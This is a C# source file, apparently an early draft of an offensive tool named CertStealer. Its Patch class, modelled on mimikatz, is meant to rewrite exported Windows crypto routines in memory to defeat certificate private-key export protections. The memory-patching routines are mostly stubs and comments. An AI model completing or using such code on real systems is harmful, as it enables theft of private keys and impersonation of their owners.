using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace CertStealer
{
    /// <summary>
    /// Patches memory to bypass certificate private key export protections.
    /// 
    /// Derived from the logic in mimikatz: https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/crypto/kuhl_m_crypto_patch.c
    /// </summary>
    class Patch
    {

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, ref uint lpflOldProtect);

        public enum Protection : uint
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }

        public static void PatchMemory(IntPtr address, byte[] data)
        {
            Marshal.Copy(data, 0, address, data.Length);
        }


        /// <summary>
        /// Patch an exported routine with data. Search for routine by export name.
        /// </summary>
        /// <param name="module">Module where the routine is located.</param>
        /// <param name="exportName"></param>
        /// <param name="data"></param>
        public static void PatchExportedRoutine(string module, string exportName, byte[] data)
        {
            // Load Library
            IntPtr hModule = LoadLibrary(module);

            // GetProcAddress
            IntPtr pFunc = GetProcAddress(hModule, exportName);

            uint oldProtect =  0;

            // Set memory permissions
            VirtualProtect(pFunc, (uint) data.Length, (uint) Protection.PAGE_READWRITE, ref oldProtect);

            // Patch memory

            // Reset memory permissions to what they were

            // Free Library
        }

        public static void PatchExportedRoutine(string module, string export, Delegate patchFunc)
        {
            // Load Library

            // GetProcAddress

            // Get thunk

            // Form array of machine code that jumps to the thunk

            // OR just copy the code of the thunk?

            // Set memory permissions

            // Patch memory with the thunk or a double thunk

            // Reset memory permissions to what they were
        }
    }
}
